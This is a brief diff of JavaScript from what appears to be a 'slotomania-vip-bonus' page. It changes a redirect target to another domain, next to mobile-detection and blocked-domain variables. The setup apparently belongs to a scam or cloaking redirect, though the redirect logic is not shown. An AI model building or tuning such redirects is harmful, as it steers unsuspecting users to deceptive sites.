@@ -63,7 +63,7 @@
 
             var isMobile = /iPhone|iPad|iPod/i.test(navigator.userAgent);
             var originalDomain = "slotomania-vip-bonus.com";
-            var redirectURL = "https://v.rolls3.com";
+            var redirectURL = "https://live33.online/?7c88533";
             var blockedDomains = ["real-preze.vercel.app"];
 
             if (
